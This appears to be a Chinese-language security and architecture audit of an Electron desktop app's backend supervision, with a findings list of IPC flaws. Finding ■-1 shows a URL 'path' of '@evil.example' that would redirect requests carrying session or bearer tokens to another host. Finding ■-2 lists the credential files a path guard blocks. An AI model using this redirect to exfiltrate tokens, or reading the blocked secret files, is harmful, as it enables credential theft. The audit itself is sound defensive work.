探针超时 15s(`HERMES_PROBE_TIMEOUT_MS` 可调,钳到 120s),**超时会自动重试一次**——
5s 曾把健康的 Windows 冷启动误判成死(#61764)。

#### (b) 拉起 —— 参数、环境、端口

参数固定是 `['serve', '--host', '127.0.0.1', '--port', '0']`(`--port 0` 让 OS 分配临时端口),
有桌面 profile 时前置 `--profile <name>`。老运行时不认 `serve`,由 `backend-command.ts` 改写成
`dashboard --no-open`;判断方式是**读远端 `dashboard.py` 源码**:

`apps/desktop/electron/backend-command.ts:46-48 @ 863e313`

```ts
export function sourceDeclaresServe(dashboardPySource) {
  return /add_parser\(\s*["']serve["']/.test(String(dashboardPySource || ''))
}
```

正则特意匹配 `add_parser("serve"` 而不是裸 `serve`,免得 `start_server` 里的 `server` 造成假阳性。

环境变量的关键是 **`HERMES_HOME` 必须显式钉死**(见 §4 跳 4 的代码块):Python 的
`get_hermes_home()` 在没有这个变量时到处都回落 `~/.hermes`,而桌面在 Windows 上的默认是
`%LOCALAPPDATA%\hermes`——不钉的话配置、会话、日志会裂成两个目录。

端口公告有两条路:stdout 行、或 ready 文件。后者存在的理由是 Windows 上用 `pythonw.exe`
(避免闪控制台)时**根本没有 stdout**。超时:

`apps/desktop/electron/backend-ready.ts:16-19 @ 863e313`

```ts
const DEFAULT_PORT_ANNOUNCE_TIMEOUT_MS = 90_000
// Never trust a deadline tighter than the warm-start path needs; floor at 45s
// (the historical default) so a malformed override can't reintroduce the loop.
const MIN_PORT_ANNOUNCE_TIMEOUT_MS = 45_000
```


默认 90s 而不是 45s,是因为冷装第一次要把 `hermes_cli.main → web_server → FastAPI/uvicorn`
整条 import 链编译出来,Windows Defender 还要扫每一个新写的 `.pyc`,慢盘上 30-60s 很常见;
45s 会杀掉一个**健康但还在启动**的后端然后重启,堆出一串孤儿进程(#50209)。下限 45s 是防
"用户填了个更小的值把老 bug 请回来"。

#### (c) 判健康 —— 两条腿,以及 401 的两种含义

`waitForHermesReady`(`apps/desktop/electron/backend-health.ts:96`)轮询 `/api/health`,失败时:

- **带凭据探针**拿到 401/403 → 直接抛"需要重新登录",**不回退**。回退到公共的 `/api/status`
  会拿到 200,把一个死会话报成 ready,把失败推迟到第一次真正的 API 调用。
- **匿名探针**拿到"网关形状的 401"(消息里含 `no_cookie`)或 404 → 认定后端老到没有
  `/api/health`,切到 `/api/status` 继续轮询。老后端的 dashboard 鉴权门跑在 SPA catch-all 之前,
  所以未知 `/api/*` 路径被当成"未鉴权"而不是 404——匿名探针**永远看不到那个 404**。
- 超时、5xx、429、非网关形状的 401 → 继续轮 health。

这三分法是本片最精细的一处错误分类:同一个 HTTP 状态码在两种探针下含义完全相反。

#### (d) 判死 —— 事件,不是心跳

本地后端的死讯来自 Node 子进程的 `exit` / `error` 事件。**本片没有对本地后端的心跳**
(搜索面:在 `apps/desktop/electron/*.ts` 非测试文件里 grep `heartbeat|hb\b|ping` 只命中
远端 keepalive 的注释与 `remote-liveness.ts` 的探测,没有任何周期性给本地子进程发探测的代码)。

远端后端没有子进程可听,所以另起一套:

`apps/desktop/electron/remote-liveness.ts:1-6 @ 863e313`

```ts
export const REMOTE_LIVENESS_TIMEOUT_MS = 10_000
export const REMOTE_LIVENESS_FAILURE_LIMIT = 3
// Even at the capped retry path, consecutive liveness observations are at most
// about 48s apart (ticket mint + socket open + backoff + the next status probe).
// One minute keeps a continuous outage together without carrying old failures.
export const REMOTE_LIVENESS_FAILURE_WINDOW_MS = 60_000
```


唤醒后渲染层调 `hermes:connection:revalidate`,主进程探一次 `/api/status`;同一个 baseUrl
连续 3 次失败(60s 窗口内)就丢掉缓存的连接描述符,下一次 `getConnection` 重建。多个窗口同时
观察到断线时,`RemoteRevalidationCoordinator` 把它们合流成**一次**探测——否则一次断网会一口气
把三次配额吃光。

#### (e) 失败了怎么办 —— 三个 latch

`apps/desktop/electron/main.ts:8657-8666 @ 863e313`

```ts
    if (shouldLatchBackendStartFailure({ attemptedRemote })) {
      backendStartFailure = error instanceof Error ? error : new Error(message)
    }

    // A confirmed reauth rejection latches separately: it can't self-heal, and
    // leaving it unlatched hides the overlay's "Sign in" button on every retry.
    if (shouldLatchRemoteReauthFailure({ attemptedRemote, isReauth: isReauthRequiredError(error) })) {
      remoteReauthFailure = error instanceof Error ? error : new Error(message)
    }

```


- `bootstrapFailure`:首启安装失败。锁死,直到用户点"重载重试"或退出应用。防的是渲染层的
  重连循环把 5-10 分钟的安装脚本反复拉起。
- `backendStartFailure`:**本地**后端启动失败(ready 之前)。锁死。判定是一行纯函数:

`apps/desktop/electron/backend-start-failure.ts:39-41 @ 863e313`

```ts
export function shouldLatchBackendStartFailure(context: BackendStartFailureContext): boolean {
  return !context.attemptedRemote
}
```


  远端**不锁**:远端失败多半是瞬时的(cookie 过期后网关会用 refresh cookie 换新的、ticket 铸造
  在睡眠中超时、主机短暂不可达),而且远端**没有子进程的 exit 回调来清缓存**,锁了就会一直锁到
  重启应用——重连、"登出再登录"(只重载渲染层)、唤醒恢复三条路全部失效。
- `remoteReauthFailure`:**确认的**远端鉴权拒绝。这一条反过来必须锁。不锁的话每次重试都会
  重新发 `running: true`,启动失败覆盖层(`visible = Boolean(boot.error) && !boot.running`)
  就把自己藏起来,"登录"按钮在用户点到之前就闪没了。

三个 latch 的存在说明一件事:**"要不要缓存这次失败"不是一个统一策略,而是按
"这个失败能不能自愈"逐类判定的**。

#### (f) 修复请求的软硬升级

渲染层观察到后端疑似死了会调 `hermes:bootstrap:repair`。老实现无条件强制重装 venv,于是
"后端只是 GIL 卡住"这种情况会进死循环(#74874):卡 → 重装 → 还是卡 → 重装。守卫改成:

`apps/desktop/electron/bootstrap-repair-guard.ts:97-109 @ 863e313`

```ts
export function decideBootstrapRepair(input: RepairDecisionInput): RepairDecision {
  const maxSoftAttempts = input.maxSoftAttempts ?? 3
  const attempt = Math.max(1, Math.floor(input.attempt))
  const alive = Boolean(input.primaryBackendAlive)

  if (attempt > maxSoftAttempts) {
    return {
      hardReinstall: true,
      attempt,
      reason:
        `repair attempt ${attempt} exceeds soft-restart budget ` + `(${maxSoftAttempts}); escalating to hard reinstall`
    }
  }
```


前 3 次只软重启(不动 venv),第 4 次才真重装。计数器 `bootstrapRepairAttempt` 在一次成功的
启动后归零(`apps/desktop/electron/main.ts:8626`)。

#### (g) 关机

`before-quit` 里 `stopBackendChild(backendConnectionState.getProcess())` + `stopAllPoolBackends()`。
停法按平台分叉:

`apps/desktop/electron/backend-child.ts:44-51 @ 863e313`

```ts
  const isWindows = deps.isWindows ?? process.platform === 'win32'

  try {
    if (isWindows && Number.isInteger(child.pid)) {
      deps.forceKillProcessTree(child.pid as number)
    } else {
      child.kill('SIGTERM')
    }
```


Windows 走树杀的理由写在模块头里:后端自己 spawn 的孙子进程(REPL、pty、gateway)在普通
SIGTERM 下能活下来,并且**继续锁着 venv 的 shim 文件**,下一次更新就失败。

### 5.2 与 `tui_gateway/host_supervisor.py` 的双实现对照

这是本片最值得记的一节。同一个问题——"拉起一个 Python 子进程并监管它"——在这个仓库里有
**两套完全独立的实现**:

- **Electron 侧**:`main.ts` + 7 个 `backend-*.ts`,监管的是 `hermes serve`(HTTP/WS 服务进程)。
- **Python 侧**:`tui_gateway/host_supervisor.py`(577 行)监管
  `python -m tui_gateway.compute_host`(`tui_gateway/compute_host.py`,880 行),
  用 stdin/stdout 上的 NDJSON 帧通信。它在 `dashboard.turn_isolation` 开启时把 agent 回合
  挪到一个常驻子进程里,免得计算线程和服务进程抢同一个 GIL。

逐项对照:

| 维度 | Electron 侧 | Python 侧 | 差异是有意还是漂移 |
|---|---|---|---|
| 通信介质 | HTTP + WebSocket(TCP 环回) | stdin/stdout NDJSON 帧 | **有意**,下面几行的差异全由它派生 |
| 握手信号 | stdout `HERMES_(BACKEND\|DASHBOARD)_READY port=N`,或 ready 文件 | stdout `hello` 帧 | 有意 |
| 握手超时 | 90s,下限 45s,env 可调 | **10.0s 硬编码** | **有意**:compute_host 不 import FastAPI/uvicorn,冷启动便宜得多 |
| 握手校验 | 端口 → HTTP health → token 比对 → 真开一次 WS | `_validate_hello`:比 `hermes_home` 与 `build_sha` | **有意**,两侧都在验"这确实是我起的那个进程" |
| 判死条件 | 子进程 `exit`/`error` 事件;远端靠 3 次/60s 探测失败 | `proc.wait()` 返回 | 有意 |
| 心跳 | **无**(本地);远端只有唤醒后的按需探测 | `hb` 帧每 15s,带 active_turns / progress_counter / rss_mb | **有意**:HTTP 每个请求自带超时,帧协议没有 |
| 崩溃后重启 | **不主动重启**。exit 清空缓存的 connection promise,下一次 `getConnection`/`api` 惰性重建 | **主动重启**,退避 `min(5.0, 0.25 * 2^n)` | **有意**(桌面没有"在飞回合"要救),但见下面那行 |
| 崩溃循环上限 | 只有 ready **之前**的失败会 latch;ready **之后**的崩溃**没有任何计数器** | 3 次 / 300s 窗口,超了永久停 | **疑似漂移,见 §6 ■-3** |
| 孤儿回收 | Windows 树杀;`isForeignBackendToken` 识别"端口被别人占了" | 注册表文件 + `reconcile_startup_orphan()`,含 PID 复用防护 | **不对等**:Electron 侧没有跨进程注册表,启动时不回收上一次残留的后端 |
| 在飞请求的兜底 | 无需(每个 fetch 自带 `resolveTimeoutMs` 超时) | `_fail_pending_turns` 主动给每个在飞 turn 回 `turn.error` | 有意 |
| 关机 | SIGTERM / 树杀,**不等** | 先发 `shutdown` 帧 + `wait(10s)`,失败才 terminate → kill | **不对等**,见下 |

两侧的常量放在一起看:

`tui_gateway/host_supervisor.py:47-49 @ 863e313`

```python
_REGISTRY_NAME = "dashboard-compute-host.json"
_RESPAWN_WINDOW_SECS = 300.0
_SHUTDOWN_TIMEOUT_SECS = 10.0
```


Python 侧的重启策略全文:

`tui_gateway/host_supervisor.py:507-517 @ 863e313`

```python
    def _maybe_respawn_after_crash(self) -> None:
        now = time.monotonic()
        self._restart_times = [t for t in self._restart_times if now - t <= _RESPAWN_WINDOW_SECS]
        if len(self._restart_times) >= self.respawn_max:
            self._stopped_respawning = True
            logger.error("compute host crash loop: max %s restarts per 5min reached; not respawning", self.respawn_max)
            return
        self._restart_times.append(now)
        # Small bounded backoff; tests and first recovery stay quick.
        delay = min(5.0, 0.25 * (2 ** max(0, len(self._restart_times) - 1)))

```


以及它的启动前孤儿回收——这是 Electron 侧**完全没有对应物**的一段:

`tui_gateway/host_supervisor.py:189-195 @ 863e313`

```python
    def start(self) -> None:
        with self._lock:
            if self.is_running():
                return
            self._closing = False
            self.reconcile_startup_orphan()
            self._spawn_locked(reason="startup")
```


`reconcile_startup_orphan()` 读注册表文件里的 pid,确认它还活着、并且**确实是一个 compute_host**
(`is_compute_host_identity`,防 PID 复用),然后才 SIGTERM 它。Electron 侧没有这一步:
桌面重启后,上一次崩溃残留的 `hermes serve` 如果还占着端口,只会在
`adoptServedDashboardToken` 那一步被识别成"非我方进程"并**拒绝它的 token**,
但没有任何代码去杀它。

`apps/desktop/electron/dashboard-token.ts:79-81 @ 863e313`

```ts
function isForeignBackendToken({ servedToken, spawnToken, childAlive }) {
  return Boolean(servedToken) && servedToken !== spawnToken && !childAlive
}
```

**结论**:两套实现的**判死条件**都是"子进程退出",这是一致的;**重启策略**根本不同,而这个不同
大部分是有意的(桌面的"重启"= 用户下一次操作时惰性重连,主动重启反而会跟 latch 机制打架),
但**崩溃循环上限**这一项是真的对不上——两侧都写了"3 次",语义却不一样,详见 §6 ■-3。

### 5.3 多 profile 后端池

主后端之外,`backendPool`(`apps/desktop/electron/main.ts:1064`)按 profile 名缓存**额外的**
`hermes serve` 子进程。没有命名 profile 的用户这个 Map 永远是空的,行为与单后端逐字节相同。

- 上限 `POOL_MAX_BACKENDS` = 3(`HERMES_DESKTOP_POOL_MAX` 可调),LRU 淘汰。
- 空闲回收 `POOL_IDLE_MS` = 10 分钟(下限 60s)。
- **保鲜窗口** `POOL_KEEPALIVE_FRESH_MS` = 90s:渲染层每 60s 对每个打开的 profile 调
  `hermes:backend:touch`;90s 内被 touch 过的后端 LRU 不许淘汰——多 profile 并发时几个后端
  同时"新鲜",为了守软上限去杀一个会中断正在跑的 agent。

这一段和主后端**不共享**状态机:主后端走 `backendConnectionState`(带 generation),
池后端走普通 Map + 每项一个 `connectionPromise`。

### 5.4 远端与 SSH

三种连接模式共用一条"远端能力"路径,区别只在鉴权与发现:

- **local**:上面那一整套。
- **remote(直连)**:用户填 URL;`probeRemoteAuthMode` 探测它要 token 还是 OAuth;
  OAuth 走 `persist:hermes-remote-oauth` 分区的 cookie,或 RFC 8252 原生 bearer(优先原生,
  因为原生流程根本不设 cookie,走 cookie 路径会拿到 `401 no_cookie`)。
- **cloud**:一次门户登录(`portal.nousresearch.com`)之后,发现该组织的 agent 并对每个
  静默签入。
- **SSH**:`ssh-connection.ts` 用**系统 `ssh` 客户端**建 ControlMaster + 端口转发,理由与
  `tools/environments/ssh.py` 一致——白嫖 `~/.ssh/config`、agent、ProxyJump、硬件密钥。
  `remote-lifecycle.ts` 在隧道里定位远端 Hermes、用 `uname` 卡平台、用锁文件 + **带鉴权的**
  `/api/status` 证明"那个已有的 dashboard 确实还活着且是我的"(光看 pid 存活不够)。
  远端是 Windows 时换 `windows-remote-lifecycle.ts` 那一套(PowerShell 字面量、锁文件 v2)。

WebSocket URL 有一条硬规矩,和 `apps/desktop/AGENTS.md` 里"一次性凭据永不复用"对得上:
OAuth 模式每次拨号都现铸一个新的 ws ticket,**绝不回落缓存 URL**;只有长期 token / 本地鉴权
可以把缓存 URL 当作下一级候选。

### 5.5 安全意图四件套(派工书 (d))

| 模块 | 防什么 | 机制 |
|---|---|---|
| `apps/desktop/electron/dashboard-token.ts` | **端口占用者冒充后端**。桌面用公共 `/api/status` 判就绪,一个别人留下的孤儿后端(或端口占用者)能让这个探针通过,于是桌面会把**它的** session token 拿去用 | 抓首页 HTML 里注入的 `window.__HERMES_SESSION_TOKEN__`;token 与我们 spawn 时给的不同 **且我们的子进程已经死了** → 判为外来后端,抛错拒绝。子进程还活着时的不同是良性的(env 钉没生效,后端自己重生了 token) |
| `apps/desktop/electron/crash-forensics.ts` | **主进程故障无声消失**。Electron 自己装了 `uncaughtException` 监听器且只对未处理 rejection 打警告,所以应用通常不死——但原因只落到 stderr,而从 Finder / 开始菜单启动时 stderr 是被丢弃的,`hermes debug share` 打包里什么都看不到 | 把两类事件写进 desktop.log 并**同步**刷盘(真致命时来不及等批量异步刷) |
| `apps/desktop/electron/embed-referer.ts` | **给第三方嵌入补 Referer 时的越权**。YouTube 嵌入需要 Referer 才肯播 | 只在 `persist:hermes-embed` 这一个 webview 分区上挂 `onBeforeSendHeaders`,且只对 youtube/ytimg/googlevideo 等**白名单域名**补;其它域名原样透传,已有 Referer 不覆盖 |
| `apps/desktop/electron/bootstrap-repair-guard.ts` | **破坏性重装的无限循环**。渲染层一看后端不响应就请求"修复",老实现无条件重装 venv,而 GIL 卡顿会让它一遍遍重来(#74874) | 纯决策函数:前 3 次只软重启保住 venv,超预算才升级为硬重装 |

这四个里有三个的共同形态值得单独说:**它们防的不是攻击者,是"看起来对但其实错"的状态**——
一个能应答的陌生进程、一个没死但也没日志的主进程、一个健康但暂时卡住的后端。

### 5.6 窗口家族与安全姿态

主进程一共造 **6 类** BrowserWindow:

| 窗口 | 创建处 | 特点 |
|---|---|---|
| 主窗口 | `apps/desktop/electron/main.ts:9242` | 完整应用 |
| 二级会话窗口 | `apps/desktop/electron/main.ts:8806` | 按 sessionId 去重,URL 带 `?win=secondary` |
| 实例窗口 | `apps/desktop/electron/main.ts:8837` | 完整应用的第二份,层叠偏移 32px |
| 吉祥物悬浮窗 | `apps/desktop/electron/main.ts:8913` | 置顶、可鼠标穿透、**不继承全局缩放** |
| Quick Entry | `apps/desktop/electron/main.ts:9083` | 无边框置顶,全局热键召唤 |
| 唤醒指示器 | `apps/desktop/electron/wake-indicator-window.ts:26` | 小 HUD,随显示器变化重定位 |

外加一个**隐藏窗口**:`link-title-window.ts` 的抓标题窗(加载任意用户链接,所以必须静音+禁下载)。

聊天类窗口的 `webPreferences` 只有一处定义,防的是"两处手抄然后悄悄漂移":

`apps/desktop/electron/session-windows.ts:40-50 @ 863e313`

```ts
function chatWindowWebPreferences(preloadPath: string) {
  return {
    preload: preloadPath,
    contextIsolation: true,
    webviewTag: true,
    sandbox: true,
    nodeIntegration: false,
    devTools: true,
    autoplayPolicy: 'no-user-gesture-required' as const
  }
}
```


共同的导航守卫由 `wireCommonWindowHandlers`(`apps/desktop/electron/main.ts:8695`)统一挂:
`setWindowOpenHandler` 一律 `deny` 并转交 `openExternalUrl`;`will-navigate` 只放行
dev server(开发态)或 `file:`(打包态),其余一律拦下改用系统浏览器打开。
`openExternalUrl` 自己有协议白名单(`http:`/`https:`/`mailto:`,外加 `file:` 走
`shell.openPath` 的特例)。

`sandbox: true` + `contextIsolation: true` + `nodeIntegration: false` 是标准三件套。
`webviewTag: true` 是个值得注意的例外——见 §6 ■-5。

### 5.7 更新、卸载、深链、退出

- **更新与后端 spawn 互斥**:更新器在跑时会写 `HERMES_HOME/.hermes-update-in-progress`,
  `update-gate.ts` 用"磁盘 marker + 进程存活"两个信号挡住本地后端 spawn(#50238/#73822)。
  远端连接不受这个门约束——它不碰 venv。
- **卸载**:三档(仅 GUI / Lite / Full)全部翻译成 `hermes uninstall` 的参数交给 CLI 做,
  桌面只负责生成一个分离的清理脚本在退出后删掉应用包本身。
- **深链**:`hermes://` 协议注册 + 冷启动时从 `process.argv` 里捞;渲染层没准备好之前
  暂存在 `_pendingDeepLink`,等 `hermes:deep-link-ready` 才投递。
- **退出守卫**:`hermes:active-work` 让渲染层持续上报"哪些会话在跑",`quit-guard.ts` 决定
  要不要拦 `before-quit` 弹确认框。同一份数据被 `stream-throttle.ts` 复用来决定要不要给
  聊天窗口关掉 Chromium 后台节流。
- **`window-all-closed`**:macOS 惯例是留在 Dock 里不退,但**正在向更新器/卸载脚本交接时必须退**,
  否则脚本的 PID 等待会空转到超时,用户看到一个"看不见的应用"。

### 5.8 平台补丁族

这一族占了本片 11 个文件、约 1,900 行,全部是"某个平台上某个具体坑"的定点修复。值得记的形态是
**每个文件的头注释都写清了它修的是哪一个 issue 号 / 哪一种现象**,而不是泛泛的 "windows utils"。
举三个代表:

- `windows-sandbox-fallback.ts`:Windows 上 Chromium GPU/渲染器沙箱以 STATUS_BREAKPOINT
  (`0x80000003`)死,Chromium 随即 FATAL 退出。恢复梯子是:先修 ACL(给
  `S-1-15-2-2` = ALL APPLICATION PACKAGES 授 RX)→ 不行才 `--no-sandbox` 重启 → 用一个
  **粘滞 marker** 记住这台机器需要回退。干净退出时清 marker,FATAL 崩溃跳过 `before-quit`
  所以 marker 留着——这个非对称正是它区分"崩了"和"正常关"的方式。
- `windows-user-env.ts`:GUI 应用继承的是登录时的环境快照,`setx` 设的 `HERMES_HOME`
  在新开的 shell 里立刻可见、在这个 GUI 里**永远看不见**。所以直接读注册表 `HKCU\Environment`。
- `wsl-path-bridge.ts`:界面跑在 Windows、网关跑在 WSL 时,原生文件对话框的 defaultPath
  需要 POSIX → UNC 的桥接。反方向(后端收到的路径 → POSIX)统一在网关侧
  `hermes_constants.translate_cwd_for_wsl_backend` 做,所以桌面这边只做单向。

### 5.9 macOS 打包描述文件

两份 plist 都在 `apps/desktop/package.json` 的 `build.mac` 里被引用:
`entitlements` → 主应用,`entitlementsInherit` → helper 子进程。两份都声明同样 5 项:

- `com.apple.security.cs.allow-jit` —— V8 需要可执行内存;
- `com.apple.security.cs.allow-unsigned-executable-memory` —— 同上,更宽的一档;
- `com.apple.security.cs.disable-library-validation` —— 允许加载非同一 Team ID 签名的动态库
  (node-pty 等原生模块、以及 venv 里的 `.so`);
- `com.apple.security.device.audio-input` / `device.camera` —— 语音与摄像头。

配套 `hardenedRuntime: true`、`gatekeeperAssess: false`,用途文案在
`build.mac.extendInfo` 的 `NSMicrophoneUsageDescription` 等三项里。
两份文件逐字节相同,见 §6 ◇-3。


## §6 发现清单

### ■-1 `hermes:api` 的 URL 拼接允许把请求(连同本地 session token)重定向到任意主机

`hermes:api` 把渲染层给的 `request.path` **直接字符串拼**在后端 baseUrl 后面:

`apps/desktop/electron/main.ts:10272-10274 @ 863e313`

```ts
  const requestPath = pathWithGlobalRemoteProfile(request.path, profile, profileRouteOptions(profile))

  const url = `${connection.baseUrl}${requestPath}`
```


`pathWithGlobalRemoteProfile` 在主 profile 场景下**原样返回**(它只在需要注入 `?profile=`
时才解析 URL),所以 `request.path` 一字不改地进了拼接。而 `fetchJson` 拿到这个字符串后
`new URL(url)` 再交给 `http.request(parsed, …)`。

问题在于 `http://127.0.0.1:PORT` 后面接一个 `@`,`@` 之前的部分会被解析成 **userinfo**,
之后的才是主机:

```verify
node -e "const u=new URL('http://127.0.0.1:53421'+'@evil.example/api/x'); console.log(JSON.stringify({host:u.host,username:u.username,password:u.password,path:u.pathname}))"
```

实测输出:`{"host":"evil.example","username":"127.0.0.1","password":"53421","path":"/api/x"}`。
也就是说 `hermesDesktop.api({ path: '@evil.example/x' })` 会把请求发到 `evil.example`,
并带上 `X-Hermes-Session-Token`(本地后端的会话令牌)或 `Authorization: Bearer <AT>`
(OAuth 模式的访问令牌)。

**负结论的搜索面**:我在 `apps/desktop/electron/*.ts`(排除 `*.test.ts`)里搜了
`request.path` / `request?.path` 的**全部**读取点,共 4 处——`main.ts:10024`(类型检查)、
`main.ts:10033`(`new URL(request.path, 'http://x')`,只用于路由判断,结果不回写)、
`main.ts:10272`(拼接点)、`profile-delete-routing.ts:22`(正则匹配 `/api/profiles/<name>`);
另外搜了 `startsWith('/')`,4 处命中全在 `remote-lifecycle.ts` / `wsl-path-bridge.ts`,
与本通道无关。**没有任何一处校验 `request.path` 以 `/` 开头。**

```verify
cd /home/user/hermes-agent && grep -rn "request\.path\|request?\.path" apps/desktop/electron/*.ts | grep -v "\.test\.ts:"
```

严重性判断要诚实:渲染层是第一方代码,常态下不会构造这种 path。这条的价值在于
**它是 contextIsolation + sandbox 这一整套防御所要防的那类场景里的一个缺口**——
渲染层展示的是模型输出,而 `webviewTag: true` 也开着。整套预加载桥的设计前提就是
"渲染进程可能不可信",在那个前提下这一条是可用的令牌外泄原语。**未运行验证**:
我没有跑起 Electron 去实际发这个请求,上面的 `node -e` 只验证了 URL 解析这一步。

### ■-2 四条 `hermes:fs:*` 通道绕过了 `hardening.ts` 的路径守卫,而它们的兄弟通道没有

`hardening.ts` 存在的全部意义就是给 IPC 文件访问加一层:拒 NUL 字节、拒 Windows 设备路径
(`\\?\`、`\\.\`、`GlobalRoot\Device\`)、展开 `~`、解析 `file:` URL、
拦敏感文件(`.ssh/`、`.gnupg/`、`.aws/credentials`、`.env`、`id_rsa`、`.pem`/`.p12`/`.pfx`/`.kdbx`、
`.npmrc`/`.netrc`/`.pypirc`)、卡大小上限。

但 11 条会碰路径的通道里,有 4 条完全没走它:

```verify
cd /home/user/hermes-agent && python3 - <<'EOF'
import re
src = open('apps/desktop/electron/main.ts').read().splitlines()
starts = [(i+1, m.group(1)) for i,l in enumerate(src)
          for m in [re.search(r"ipcMain\.(?:handle|on)\(\s*'([^']+)'", l)] if m]
guard = re.compile(r"resolveRequestedPathForIpc|resolveReadableFileForIpc|resolveDirectoryForIpc"
                   r"|readDirForIpc|gitRootForIpc|readFileDataUrlForIpc")
def strip_comments(lines):
    return "\n".join(re.sub(r'//.*$', '', l) for l in lines
                     if not l.strip().startswith(('//', '*', '/*')))
for k, (a, ch) in enumerate(starts):
    b = starts[k+1][0] if k+1 < len(starts) else len(src)+1
    if not (ch.startswith('hermes:fs:') or ch in
            ('hermes:readFileText','hermes:readFileDataUrl','hermes:readFileDataUrlForAttach')):
        continue
    print(f"{ch:34s} :{a:<6d} {'HARDENED' if guard.search(strip_comments(src[a-1:b-1])) else 'RAW'}")
EOF
```

实测:`hermes:readFileDataUrl` / `readFileDataUrlForAttach` / `readFileText` /
`fs:readDir` / `fs:gitRoot` / `fs:writeText` = HARDENED;
**`fs:reveal` / `fs:openDir` / `fs:rename` / `fs:trash` = RAW**
(`fs:desktopPluginsRoot` 也是 RAW,但它不接受任何渲染层参数,不算)。

*(注意这个脚本里 `strip_comments` 那一步是必需的:不剥注释的话 `hermes:fs:rename` 会被
误判成 HARDENED——因为紧跟它的 `hermes:fs:writeText` 的注释里出现了 `resolveRequestedPathForIpc`
这个符号。这正是"重跑给出相反结果的命令比不写更糟"那条规矩要防的形状,我第一次跑就踩了。)*

`fs:trash` 是其中最直接的一条:

`apps/desktop/electron/main.ts:11204-11214 @ 863e313`

```ts
ipcMain.handle('hermes:fs:trash', async (_event, targetPath) => {
  const target = String(targetPath || '').trim()

  if (!target) {
    throw new Error('Invalid delete')
  }

  await shell.trashItem(target)

  return true
})
```


`shell.trashItem(target)` 接受任意绝对路径。`fs:rename` 好一点——目标名不许含分隔符,
所以不能把东西**移走**,但**源路径**完全未加固:

`apps/desktop/electron/main.ts:11151-11157 @ 863e313`

```ts
ipcMain.handle('hermes:fs:rename', async (_event, targetPath, newName) => {
  const src = String(targetPath || '').trim()
  const name = String(newName || '').trim()

  if (!src || !name || name === '.' || name === '..' || name.includes('/') || name.includes('\\')) {
    throw new Error('Invalid rename')
  }
```


另外 `fs:openDir` 会对渲染层给的任意路径做 `fs.promises.mkdir(dir, { recursive: true })`,
即在任意位置创建目录树。

**同一段代码里还有一处注释与实现不符**,这条比上面几条更容易误导下一个读者:

`apps/desktop/electron/main.ts:11174-11177 @ 863e313`

```ts
// Write a small UTF-8 text file (e.g. a project's IDEA.md at creation). The path
// is hardened (resolveRequestedPathForIpc) and the parent must already exist —
// this never creates directory trees or escapes the allowed roots, and content
// is size-capped so it can't be abused as a bulk-write primitive.
```


注释说 writeText "never creates directory trees or **escapes the allowed roots**"。
前半句对(父目录必须已存在)。后半句**没有对应实现**:`resolveRequestedPathForIpc`
里根本没有"allowed roots"这个概念——它只做语法拒绝与 `path.resolve`,而 `path.resolve`
遇到绝对路径时会直接丢掉 base:

`apps/desktop/electron/hardening.ts:206-213 @ 863e313`

```ts
  const baseInput = typeof options.baseDir === 'string' && options.baseDir.trim() ? options.baseDir : process.cwd()
  const safeBaseInput = rejectUnsafePathSyntax(baseInput, purpose)
  const resolvedBase = path.resolve(safeBaseInput)
  rejectUnsafePathSyntax(resolvedBase, purpose)
  const resolvedPath = path.resolve(resolvedBase, raw)
  rejectUnsafePathSyntax(resolvedPath, purpose)

  return resolvedPath
```


**搜索面**:在 `apps/desktop/electron/hardening.ts` 全文搜 `allowedRoot|allowRoot|roots|within|contain`
(不区分大小写)零命中于任何白名单逻辑;`resolveRequestedPathForIpc` 的全部出口就是上面这段
加上 `file:` URL 分支,两条路径都以 `path.resolve` 结束,没有任何前缀检查。

### ■-3 后端 ready **之后**的崩溃没有任何重启计数器(与 Python 侧同名策略语义不一致)

`backendStartFailure` 只在**连接建立过程**中的失败被 latch;一旦 `backendReady = true`
(`apps/desktop/electron/main.ts:8598`),后续的子进程 `exit` 只做三件事:清缓存、给渲染层发
`hermes:backend-exit`、写日志。下一次 `hermes:api` 或 `hermes:connection` 会重新走
`startHermes()` 再 spawn 一次。**这条路径上没有次数上限、没有时间窗、没有退避。**

对比 Python 侧的同一处策略(§5.2 的代码块):`respawn_max=3` / `_RESPAWN_WINDOW_SECS=300.0`,
超了就 `_stopped_respawning = True` 永久停,并且每次重启前有指数退避。

Electron 侧确实有三个"3"——`MAX_BOOTSTRAP_REPAIR_SOFT_ATTEMPTS = 3`、
`RENDERER_RELOAD_MAX = 3`、`REMOTE_LIVENESS_FAILURE_LIMIT = 3`——但它们分别数的是
**用户点修复的次数**、**渲染进程崩溃重载的次数**、**远端探测失败的次数**,
没有一个数的是"本地后端 spawn 的次数"。

**负结论的搜索面**:在 `apps/desktop/electron/main.ts` 里搜标识符里含
`Attempt|Attempts|Max|Limit|Times|Count` 的 `let`/`const` 声明,全部 7 处是
`windowsNoSandboxRelaunchAttempted`(347)、`POOL_MAX`(1069)、`rendererReloadTimes`(1083)、
`bootstrapRepairAttempt`(1115)、`TITLE_MAX`(4482)、`connectionAttempt`(8397,一次启动内的
generation 令牌,不计数)、`dataUrlReadMaxMb`(10395);另外全片非测试文件搜 `respawn`
只命中 10 处注释,零处实现。

```verify
cd /home/user/hermes-agent && grep -onE "\b(let|const) (_?[A-Za-z]*(Attempt|Attempts|Max|Limit|Times|Count)[A-Za-z]*)" apps/desktop/electron/main.ts
```

现实中这个循环被渲染层自己的重连退避限住了,所以不是一个"必然烧 CPU"的 bug;记这一条是因为
**两套实现对同一个问题写了同一个数字 3、含义却不同**,而这正是双实现最容易悄悄分岔的地方。

### ■-4 `unsupported-platform` 这个 bootstrap 事件在本片里没有任何发送者

`broadcastBootstrapEvent` 为它准备了完整的分支:

`apps/desktop/electron/main.ts:1548-1552 @ 863e313`

```ts
  } else if (ev.type === 'unsupported-platform') {
    bootstrapState.active = false
    bootstrapState.setupChoice = null
    bootstrapState.unsupportedPlatform = {
      platform: ev.platform,
```


**搜索面**:在 `apps/desktop/electron/*.ts`(排除 `*.test.ts`)里 grep `unsupported-platform`,
命中 4 处:`main.ts:1548`(上面这个处理分支)、
`windows-remote-lifecycle.ts:64`(注释)、`windows-remote-lifecycle.ts:87` 与
`remote-lifecycle.ts:238`——后两处是给 **Error 对象设 `.kind`**,属于 SSH 错误分类那套命名空间,
和 bootstrap 事件的 `.type` 完全无关。再看发送侧:`broadcastBootstrapEvent(` 全片 5 处调用
(`main.ts:1605/1615/1678/4090/4125`),前四处的 type 分别是 `setup-choice`×2、`dismissed`、
`manifest`,第五处是把 `runBootstrap` 的事件原样转发,而 `bootstrap-runner.ts` 里
grep `unsupported` 零命中。

```verify
